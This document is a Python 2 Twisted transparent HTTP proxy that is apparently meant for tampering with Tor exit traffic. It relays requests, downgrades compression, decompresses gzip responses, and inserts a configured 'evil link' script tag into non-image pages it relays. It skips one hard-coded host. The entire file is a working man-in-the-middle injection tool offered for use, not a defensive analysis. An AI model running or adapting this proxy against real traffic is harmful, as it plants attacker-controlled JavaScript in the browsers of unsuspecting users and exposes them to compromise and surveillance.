#!/usr/bin/python
# from "jackin' tor traffic paper from packetstorm!"
from twisted.web import http
from twisted.internet import reactor, protocol
from twisted.python import log

import eproxy_config, zlib, gzip, StringIO, sys, re

log.startLogging(open(eproxy_config.LOGFILE, 'w'))

class ProxyClient(http.HTTPClient):

    def __init__(self, method, uri, postData, headers, originalRequest):
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest
        self.contentLength = None
        self.isCompressed = False
        self.isImageRequest = False

    def sendRequest(self):
        log.msg("Sending request: %s %s" % (self.method, self.uri))
        self.sendCommand(self.method, self.uri)

    def sendHeaders(self):
        for key, values in self.headers:
            if key.lower() == 'connection':
                values = ['close']
            elif key.lower() == 'keep-alive':
                next
            elif key.lower() == 'accept-encoding':
                values = ['deflate']

            for value in values:
                self.sendHeader(key, value)
        self.endHeaders()

    def sendPostData(self):
        log.msg("Sending POST data")
        self.transport.write(self.postData)

    def connectionMade(self):
        log.msg("HTTP connection made")
        self.sendRequest()
        self.sendHeaders()
        if self.method == 'POST':
            self.sendPostData()

    def handleStatus(self, version, code, message):
        log.msg("Got server response: %s %s %s" % (version, code, message))
        self.originalRequest.setResponseCode(int(code), message)

    def handleHeader(self, key, value):

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                log.msg("Response is compressed...")
                self.isCompressed = True

        if key.lower() == 'content-length':
            self.contentLength = value
        else:
            self.originalRequest.responseHeaders.addRawHeader(key, value)

    def injectJavaScriptLink(self, data):

        if self.isImageRequest:
            return data
        
        evil_link = eproxy_config.EVILLINK
        line_pattern = eproxy_config.PATTERN
           
        match_found = False
        matches = re.finditer(line_pattern, data)

        m = None
        for m in matches:
            match_found = True
            pass

        if match_found:
            log.msg("\n[*] Adding host to injected clients list...\n")
            m.start()
            m.end()
            data = data[0:m.end()] + evil_link + data[m.end():]

        return data

    def handleResponse(self, data):
        data = self.originalRequest.processResponse(data)

        if (self.isCompressed):
            log.msg("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
        
        #log.msg("Read from server:\n" + data)
        data = self.injectJavaScriptLink(data)

        if self.contentLength != None:
            self.originalRequest.setHeader('Content-Length', len(data))

        self.originalRequest.write(data)

        self.originalRequest.finish()
        self.transport.loseConnection()

class ProxyClientFactory(protocol.ClientFactory):
    def __init__(self, method, uri, postData, headers, originalRequest):
        self.protocol = ProxyClient
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest

    def buildProtocol(self, addr):
        return self.protocol(self.method, self.uri, self.postData,
                             self.headers, self.originalRequest)

    def clientConnectionFailed(self, connector, reason):
        log.err("Server connection failed: %s" % reason)
        self.originalRequest.setResponseCode(504)
        self.originalRequest.finish()

class ProxyRequest(http.Request):
    def __init__(self, channel, queued, reactor=reactor):
        http.Request.__init__(self, channel, queued)
        self.reactor = reactor

    def process(self):
        host = self.getHeader('host')
        log.msg("host: %s\n" % host)
        if not host:
            log.err("No host header given")
            self.setResponseCode(400)
            self.finish()
            return
 
        if host == 'vps6.vpnzz.com':
            self.setResponseCode(400)
            self.finish()
            return

        port = 80
        if ':' in host:
            host, port = host.split(':')
            port = int(port)

        self.setHost(host, port)

        self.content.seek(0, 0)
        postData = self.content.read()
        factory = ProxyClientFactory(self.method, self.uri, postData,
                                     self.requestHeaders.getAllRawHeaders(),
                                     self)
        self.reactor.connectTCP(host, port, factory)

    def processResponse(self, data):
        return data

class TransparentProxy(http.HTTPChannel):
    requestFactory = ProxyRequest
 
class ProxyFactory(http.HTTPFactory):
    protocol = TransparentProxy
 
reactor.listenTCP(8888, ProxyFactory())
reactor.run()